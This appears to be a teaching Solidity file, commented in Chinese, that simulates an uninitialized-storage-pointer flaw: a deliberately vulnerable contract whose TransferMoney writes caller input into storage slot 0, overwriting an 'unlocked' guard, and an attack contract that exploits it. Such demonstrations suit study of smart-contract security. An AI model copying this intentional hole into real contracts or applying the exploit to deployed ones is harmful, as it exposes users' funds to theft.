pragma solidity >=0.8.0;

// 漏洞示範：Uninitialized Storage Variables (模擬)
// 說明：由於 Solidity >=0.8.0 版本禁止未初始化的 storage 指標，
// 為了模擬該漏洞，我們改以 inline assembly 直接操作 storage slot 0，
// 這會覆寫在 slot 0 上的資料（例如 unlocked 變數），導致安全性問題。

contract PaySupplierVuln {
    // 狀態變數 unlocked 定義在 slot 0
    bool public unlocked = false; // 漏洞重點：此變數可能被未經意識的操作修改

    // 結構 Person 定義
    struct Person {
        bytes32 name;
        // 其他欄位可加入
    }

    // 漏洞函式 TransferMoney
    // 模擬未初始化 storage 指標帶來的問題：
    // 攻擊者藉由提供特定參數，利用 inline assembly 直接將 _name 寫入 slot 0，
    // 進而覆蓋 unlocked 的值，使 require(unlocked) 通過。
    function TransferMoney(bytes32 _name) public {
        // 以下 assembly 區塊直接將 _name 寫入 storage 的 slot 0
        // 模擬未初始化 storage 指標預設指向 slot 0 之結果
        assembly {
            sstore(0, _name) // 將 _name 存入 slot 0，覆蓋 unlocked
        }
        require(unlocked, "unlocked is false");
    }

    // 可接收 Ether 的 receive 函式
    receive() external payable {}
}

// 攻擊合約：展示如何利用上述漏洞繞過 require 檢查
contract AttackPaySupplierVuln {
    PaySupplierVuln public target;

    // 部署時傳入目標合約位址
    constructor(PaySupplierVuln _target) {
        target = _target;
    }

    // 攻擊流程說明：
    // 1. 呼叫 attack() 並傳入非零的 bytes32 值，如 bytes32(uint256(1))。
    // 2. 在 TransferMoney 函式中，assembly 語句將該值寫入 slot 0，覆蓋 unlocked 變數。
    // 3. 由於 unlocked 變為非零（true），require(unlocked) 將通過，攻擊成功。
    function attack() public {
        target.TransferMoney(bytes32(uint256(1)));
    }
}
